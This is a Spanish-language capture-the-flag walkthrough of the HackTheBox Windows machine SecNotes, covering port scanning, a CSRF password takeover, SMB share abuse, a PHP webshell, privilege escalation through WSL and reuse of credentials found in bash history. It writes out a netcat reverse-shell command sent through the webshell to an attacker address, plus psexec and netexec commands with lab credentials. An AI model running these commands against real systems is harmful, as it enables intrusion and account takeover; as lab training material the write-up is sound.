# SecNotes

![](../../../../~gitbook/image.md)Publicado: 16 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
SecNotes es una máquina Windows de dificultad Easy de HackTheBox que presenta una aplicación web de notas seguras vulnerable a ataques CSRF. La explotación involucra el secuestro de cuentas de usuario, acceso a recursos compartidos SMB, ejecución de código remoto a través de IIS, y escalada de privilegios mediante el subsistema Windows Subsystem for Linux (WSL). Esta máquina es excelente para practicar técnicas de web hacking, enumeración de servicios Windows y escalada de privilegios en entornos híbridos Windows/Linux.Puntos clave de aprendizaje:- 🎯 Explotación de vulnerabilidades CSRF en aplicaciones web
- 🔑 Enumeración y explotación de servicios SMB
- 🌐 Subida de webshells y ejecución remota de comandos en IIS
- 🐧 Escalada de privilegios através de WSL (Windows Subsystem for Linux)
- 🔍 Análisis de historial de comandos para obtención de credenciales

###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🔍 Escaneo de puertos

####🛠️ Enumeración de servicios

###🎯 Enumeración de Servicios

####🌐 HTTP (Puerto 80) - Aplicación de Notas Seguras
Encontramos un panel de login de lo que parece ser una aplicación de notas seguras. Además hay una opción de registro.URL: [http://10.10.10.97/login.php](http://10.10.10.97/login.php)![](../../../../~gitbook/image.md)Al registrarnos tenemos acceso a una serie de opciones![](../../../../~gitbook/image.md)
####👤 Enumeración de usuarios
Hay un banner en el que podemos enumerar un usuario llamado tyler. También aparece en la sección de contacto.![](../../../../~gitbook/image.md)🔨 Fuzzing de directoriosEl fuzzing de directorios no revela ningún otro recurso que añadir a nuestro scope como posible vía potencial de ataque.
###🚨 Explotación Web - Ataque CSRF

####🎯 Identificación de la vulnerabilidad
Después de probar algunas cosas encuentro que puedo realizar un CSRF en la función `Contact Us`. Esta funcionalidad permite enviar mensajes a otros usuarios de la aplicación.![](../../../../~gitbook/image.md)
####💣 Ejecución del CSRF
Trato de aprovecharme de esto cambiando la clave de tyler. Cambiaré la petición `POST` de la función `Change Password` a una `GET`, para que pueda cambiar la clave de Tyler por otra cuando visite mi enlace malicioso.![](../../../../~gitbook/image.md)Ahora puedo autenticarme como tyler:![](../../../../~gitbook/image.md)Al revisar sus notas encuentro lo que parece ser un recurso compartido y una contraseña:![](../../../../~gitbook/image.md)Credenciales encontradas:
###🗂️ Explotación SMB

####🔐 Validación de credenciales
Decido probar estas credenciales con el servicio SMB usando la herramienta netexec y confirmo que son válidas:📁 Enumeración de recursos compartidos![](../../../../~gitbook/image.md)🔍 Exploración del recurso new-siteEnumeramos el recurso `new-site`, que lo único que parece contener en la web en construcción del sitio IIS que hay en el puerto 8808Sin embargo, lo más interesante aquí, es que tyler tiene tiene permisos de lectura y escritura sobre este recurso.![](../../../../~gitbook/image.md)
####🚀 Acceso Inicial al Sistema
❌ Intento fallido con psexecPrimero intentamos sin éxito ganar acceso usando impacket-psexec:
####🕷️ Webshell a través de IIS
Así que optamos por la opción de intentar subir un archivo malicioso al directorio new-site que puede ser interpretado por el servidor IIS.Me creo una webshell en php básica:A continuación la subo al servidor SMB:![](../../../../~gitbook/image.md)Y confirmamos la ejecución remota de comandos![](../../../../~gitbook/image.md)Podríamos aprovechar esto para subir también la herramienta nc.exe al recureso smb /new-site y usarlo para establecer conexión con nuestro host de ataque![](../../../../~gitbook/image.md)Ganamos acceso al sistema y obtenemos la primera flag:
###🔝 Escalada de Privilegios
Tras un rato enumerando la máquina buscando algúna potencial vía de escalada de privilegios, decido subir Winpeas.exe para ver qué encuentra y veo algo interesante:![](../../../../~gitbook/image.md)
####🐧 Descubrimiento de WSL

####🔗 Análisis del enlace bash.lnk
Si revisamos el contenido de bash.lnk podremos ver que se está referenciando la ruta del binario de bash que ha encontrado Winpeas![](../../../../~gitbook/image.md)
####🚪 Acceso al subsistema Linux
Al ejecutar el binario de bash comprobamos que accedemos a este subsistema Linux como root:![](../../../../~gitbook/image.md)
####🔍 Búsqueda de credenciales en historial
Tras explorar el subsistema Linux y mejorar la TTY con Python, encuentro credenciales en el archivo `.bash_history` de root:
####🔑 Credenciales de Administrator
Credenciales encontradas:Ahora simplemente usamos netexec para validar esta credencial contra el servicio SMB:Ganamos acceso al sistema usando impacket-psexec y ya podemos obtener la flag root.txt:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🎯 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🚨 Explotación Web - Ataque CSRF](#explotacion-web-ataque-csrf)
- [🗂️ Explotación SMB](#explotacion-smb)
- [🔝 Escalada de Privilegios](#escalada-de-privilegios)

```
❯ ping -c2 10.10.10.97
PING 10.10.10.97 (10.10.10.97) 56(84) bytes of data.
64 bytes from 10.10.10.97: icmp_seq=1 ttl=127 time=48.0 ms
64 bytes from 10.10.10.97: icmp_seq=2 ttl=127 time=47.7 ms

--- 10.10.10.97 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 47.695/47.870/48.046/0.175 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.97 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
80,445,8808
```

```
nmap -sC -sV -p$ports 10.10.10.97 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 18:11 CEST
Nmap scan report for 10.10.10.97
Host is up (0.047s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery:
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2025-06-16T09:11:41-07:00
| smb-security-mode:
|   account_used:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2025-06-16T16:11:44
|_  start_date: N/A

```

```
feroxbuster -u http://10.10.10.97 -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 503 -x php,xml,asp,aspx

___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
🎯  Target Url            │ http://10.10.10.97
🚀  Threads               │ 50
📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
💢  Status Code Filters   │ [503]
💥  Timeout (secs)        │ 7
🦡  User-Agent            │ feroxbuster/2.11.0
💉  Config File           │ /etc/feroxbuster/ferox-config.toml
🔎  Extract Links         │ true
📂  Scan Dir Listings     │ true
💲  Extensions            │ [php, xml, asp, aspx]
🏁  HTTP methods          │ [GET]
📍  Follow Redirects      │ true
🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       35l       85w     1223c http://10.10.10.97/login.php
200      GET       41l      106w     1569c http://10.10.10.97/register.php
500      GET       29l       89w     1208c http://10.10.10.97/db.php
200      GET       35l       85w     1223c http://10.10.10.97/Login.php
500      GET       29l       89w     1208c http://10.10.10.97/auth.php
200      GET       41l      106w     1569c http://10.10.10.97/Register.php
500      GET       29l       89w     1208c http://10.10.10.97/DB.php
```

```
python3 -m http.server 80
```

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

```
netexec smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&'
```

```
netexec smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
```

```
smbclient \\\\10.10.10.97\\new-site -U "tyler"
Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.
smb: \> dir
.                                   D        0  Mon Jun 16 18:44:11 2025
..                                  D        0  Mon Jun 16 18:44:11 2025
iisstart.htm                        A      696  Thu Jun 21 17:26:03 2018
iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018
```

```
smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&'
```

```
impacket-psexec tyler:'92g!mA8BGjOirkL%OG*&'@10.10.10.97

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.10.97.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[*] Found writable share new-site
[*] Uploading file pAtUkzUP.exe
[*] Opening SVCManager on 10.10.10.97.....
[-] Error opening SVCManager on 10.10.10.97.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager
```

```
echo "" >> wwwshell.php
```

```
http://10.10.10.97:8808/wwwshell.php?cmd=whoami
```

```
http://10.10.10.97:8808/wwwshell.php?cmd=nc.exe+-e+cmd.exe+10.10.14.7+443
```

```
C:\Users\tyler\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is 1E7B-9B76

Directory of C:\Users\tyler\Desktop

08/19/2018  03:51 PM              .
08/19/2018  03:51 PM              ..
06/22/2018  03:09 AM             1,293 bash.lnk
08/02/2021  03:32 AM             1,210 Command Prompt.lnk
04/11/2018  04:34 PM               407 File Explorer.lnk
06/21/2018  05:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  09:17 AM             1,110 Notepad++.lnk
06/16/2025  09:07 AM                34 user.txt
08/19/2018  10:59 AM             2,494 Windows PowerShell.lnk
7 File(s)          7,965 bytes
2 Dir(s)  13,859,487,744 bytes free

C:\Users\tyler\Desktop>type user.txt
type user.txt
```

```
C:\Users\tyler\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is 1E7B-9B76

Directory of C:\Users\tyler\Desktop

08/19/2018  03:51 PM              .
08/19/2018  03:51 PM              ..
06/22/2018  03:09 AM             1,293 bash.lnk
08/02/2021  03:32 AM             1,210 Command Prompt.lnk
04/11/2018  04:34 PM               407 File Explorer.lnk
06/21/2018  05:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  09:17 AM             1,110 Notepad++.lnk
06/16/2025  09:07 AM                34 user.txt
08/19/2018  10:59 AM             2,494 Windows PowerShell.lnk
7 File(s)          7,965 bytes
2 Dir(s)  13,830,152,192 bytes free
```

```
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@SECNOTES:~# ls -la
ls -la
total 8
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
root@SECNOTES:~# cat .bash_history
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history
less .bash_history
```

```
administrator:u6!4ZwgwOM#^OBf#Nwnh
```

```
netexec smb 10.10.10.97 -u 'administrator' -p 'u6!4ZwgwOM#^OBf#Nwnh'
SMB         10.10.10.97     445    SECNOTES         [*] Windows 10 / Server 2016 Build 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.10.10.97     445    SECNOTES         [+] SECNOTES\administrator:u6!4ZwgwOM#^OBf#Nwnh (Pwn3d!)
```

```
impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
```
